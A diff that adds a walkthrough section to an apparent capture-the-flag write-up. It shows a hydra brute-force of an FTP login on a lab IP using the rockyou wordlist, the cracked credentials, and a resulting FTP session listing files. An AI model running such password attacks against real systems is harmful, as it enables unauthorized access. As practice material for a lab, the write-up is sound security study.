@@ -104,4 +104,37 @@ Q5 SSH password
 
 ```
 hackerrules!
-``
+```
+
+### MyWalk
+
+For Q3 lets try **hydra** as sugested by the hint:
+
+```bash
+hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.149.150 -t 4
+...
+[21][ftp] host: 10.10.149.150 login: chris password: crystal
+1 of 1 target successfully completed, 1 valid password found
+```
+Q1 done
+
+Now lets connect to the ftp server with chris:crystal
+
+```bash
+└─$ ftp chris@10.10.149.150
+Connected to 10.10.149.150.
+220 (vsFTPd 3.0.3)
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||36713|)
+150 Here comes the directory listing.
+-rw-r--r-- 1 0 0 217 Oct 29 2019 To_agentJ.txt
+-rw-r--r-- 1 0 0 33143 Oct 29 2019 cute-alien.jpg
+-rw-r--r-- 1 0 0 34842 Oct 29 2019 cutie.png
+226 Directory send OK.
+ftp>
+```
